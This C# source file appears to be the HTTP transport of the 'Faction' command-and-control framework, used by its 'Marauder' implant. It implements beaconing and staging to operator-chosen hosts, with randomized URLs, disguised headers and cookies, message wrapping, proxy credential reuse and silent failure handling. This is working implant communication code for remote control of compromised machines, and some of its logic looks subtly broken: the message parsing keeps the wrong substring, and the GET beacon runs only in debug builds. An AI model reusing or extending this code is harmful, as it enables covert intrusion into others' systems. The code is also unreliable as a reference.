using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Text;
using System.IO;
using System.Reflection;
using Faction.Modules.Dotnet.Common;
using Newtonsoft.Json;

namespace Faction.Modules.Dotnet
{
#if DEBUG
  public static class Logging
  {
    public static void Log(string message)
    {
      Console.WriteLine($"({DateTime.Now.ToString("o")}) [Marauder HTTP Transport] - {message}");
    }
  }
#endif

  public class MessageConfig
  {
    // This is the default response when there is no payload.
    public string Default;

    // This text will be added before the base64 encoded 
    // payload string
    public string Prepend;

    // This text will be added after the base64 encoded
    // payload string
    public string Append;
  }

  public class AgentIdentifier
  {
    public string Location;
    public string Name;
  }

  public class AgentProfile
  {
    // Host to connect to
    public List<string> Hosts;

    // URLs to use
    public List<string> URLs;

    // List of headername:values that will be added to
    // each response
    public Dictionary<string, string> Headers;

    // List of cookiename:values that will be added to
    // each response
    public Dictionary<string, string> Cookies;
    public AgentIdentifier CheckinIdentifier;
    public AgentIdentifier StagingIdentifier;
    public MessageConfig MessageConfig;
    public MessageConfig ServerMessageConfig;
  }


  public class HTTPTransport : AgentTransport
  {
    public override string Name { get { return "HTTP"; } }
    public AgentProfile Profile;
    static public Random Random = new Random();


    private string GetUrl()
    {
      // pick host from list 
      string host = Profile.Hosts[Random.Next(Profile.Hosts.Count)];
      // pick random url from list
      string url = Profile.URLs[Random.Next(Profile.URLs.Count)];
      return $"{host}{url}";
    }

    private string RenderMessage(string Message)
    {
      if (String.IsNullOrEmpty(Message))
      {
        return Profile.MessageConfig.Default;
      }
      else
      {
        return $"{Profile.MessageConfig.Prepend}{Message}{Profile.MessageConfig.Append}";
      }
    }

    private string GetFactionMessage(string Content)
    {
      string factionMessage = Content.Remove(0, Profile.ServerMessageConfig.Prepend.Count());
      factionMessage = factionMessage.Substring(factionMessage.Length - Profile.ServerMessageConfig.Append.Count());
      return factionMessage;
    }

    private WebClient AddIdentifier(WebClient webClient, string Type, string Identifier)
    {
      if (Type == "Staging")
      {
        // Add the Stage Message into the request per the configuration
        if (Profile.StagingIdentifier.Location == "Header")
        {
          webClient.Headers.Add(Profile.StagingIdentifier.Name, Identifier);
        }
        else if (Profile.StagingIdentifier.Location == "Cookie")
        {
          webClient.Headers.Add(HttpRequestHeader.Cookie, $"{Profile.StagingIdentifier.Name}={Identifier}");
        }
      }
      else if (Type == "Beacon")
      {
        // Add the Stage Message into the request per the configuration
        if (Profile.CheckinIdentifier.Location == "Header")
        {
          webClient.Headers.Add(Profile.CheckinIdentifier.Name, Identifier);
        }
        else if (Profile.CheckinIdentifier.Location == "Cookie")
        {
          webClient.Headers.Add(HttpRequestHeader.Cookie, $"{Profile.CheckinIdentifier.Name}={Identifier}");
        }
      }
      return webClient;
    }

    private WebClient CreateWebClient(string Type, string Identifier)
    {
#if DEBUG
      Logging.Log($"Creating Web Client..");
#endif

      //force Tls 1.1 or Tls 1.2 because Tls 1.0 not works!
      ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0x300 | 0xc00);
      WebClient _webClient = new WebClient();

      // add proxy aware webclient settings
      _webClient.Proxy = WebRequest.DefaultWebProxy;
      _webClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

      foreach (KeyValuePair<string, string> header in Profile.Headers)
      {
        _webClient.Headers.Add(header.Key, header.Value);
      }

      foreach (KeyValuePair<string, string> cookie in Profile.Cookies)
      {
        _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{cookie.Key}={cookie.Value}");
      }
      _webClient = AddIdentifier(_webClient, Type, Identifier);
      return _webClient;
    }

    public HTTPTransport()
    {
      try
      {
#if DEBUG
        Logging.Log($"Initializing..");
#endif
        Stream settingsStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("HttpTransport.settings.json");
        Profile = JsonConvert.DeserializeObject<AgentProfile>(new StreamReader(settingsStream).ReadToEnd());
      }
      catch (Exception e)
      {
#if DEBUG
        Logging.Log($"Problem initializing transport: {e.Message}");
#endif
      }
    }

    public override string Stage(string StageName, string StagingId, string Message)
    {
#if DEBUG
      Logging.Log($"Sending Stage Request. Name: {StageName}, Id: {StagingId}, Message: {Message}");
#endif
      string response = "";

      try
      {
        string beaconUrl = GetUrl();
        // Create a new WebClient object and load the Headers/Cookies per the Client Profile
        WebClient _webClient = CreateWebClient("Staging", StagingId);
        string stagingMessage = RenderMessage(Message);

#if DEBUG
        Logging.Log($"Sending POST. URL: {beaconUrl} Message: {stagingMessage}");
#endif

        string content = _webClient.UploadString(beaconUrl, stagingMessage);

        // parse the content based on the "shared" configuration
        response = GetFactionMessage(content);
      }
      catch (Exception e)
      {
        // We don't want to cause an breaking exception if it fails to connect
#if DEBUG
        Logging.Log($"Connection failed: {e.Message}");
#endif
        response = "ERROR";
      }
      return response;
    }

    public override string Beacon(string AgentName, string Message)
    {
#if DEBUG
      Logging.Log($"Beaconing..");
#endif
      WebClient _webClient = CreateWebClient("Beacon", AgentName);
      string beaconUrl = GetUrl();
      string agentMessage = "";
      string content = "";

      if (!String.IsNullOrEmpty(Message))
      {
        agentMessage = RenderMessage(Message);
      }
      try
      {
        if (String.IsNullOrEmpty(agentMessage))
        {
#if DEBUG
          Logging.Log($"GETting URL: {beaconUrl}");
          content = _webClient.DownloadString(beaconUrl);
#endif
        }
        else
        {
#if DEBUG
          Logging.Log($"POSTing to URL: {beaconUrl}");
#endif
          content = _webClient.UploadString(beaconUrl, agentMessage);
        }

        // parse the content based on the "shared" configuration
        string response = GetFactionMessage(content);

        return response;
      }
      catch (Exception e)
      {
        // We don't want to cause an breaking exception if it fails to connect
#if DEBUG
        Logging.Log($"Connection failed: {e.Message}");
#endif
        return "ERROR";
      }
    }
    public class Initialize
    {
      public static List<AgentTransport> GetTransports()
      {
#if DEBUG
        Logging.Log($"Initializing..");
#endif

        List<AgentTransport> transports = new List<AgentTransport>();
        transports.Add(new HTTPTransport());
        return transports;
      }
    }
  }
}